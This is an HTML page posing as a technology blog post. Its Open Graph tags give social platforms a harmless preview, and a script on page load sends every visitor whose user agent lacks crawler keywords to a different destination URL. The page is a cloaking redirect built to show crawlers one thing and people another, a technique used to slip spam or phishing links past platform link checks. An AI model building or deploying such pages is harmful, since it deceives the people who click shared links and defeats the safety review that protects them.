<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="My Blog Post">
    <meta property="og:description" content="Read the latest blog post about technology trends.">
    <meta property="og:image" content="https://urltiger.com/content/images/TGUKWh_WhatsApp-Image-2024-09-22-at-19.04.11_41a34789.jpg">
    <meta property="og:url" content="https://fusionwaveshop.com/yaban.html">
    <title>Redirecting...</title>
    <script>
        // Function to detect if the visitor is a bot
        function isBot() {
            let botKeywords = ["facebook", "twitter", "googlebot", "bingbot", "crawler", "spider", "bot"];
            let userAgent = navigator.userAgent.toLowerCase();
            return botKeywords.some(bot => userAgent.includes(bot));
        }

        // If it's not a bot, redirect the user
        if (!isBot()) {
            window.location.href = "https://yourfinaldestination.com";
        }
    </script>
</head>
<body>
    <h1>Welcome to My Blog</h1>
    <p>Stay updated with the latest news and trends.</p>
</body>
</html>
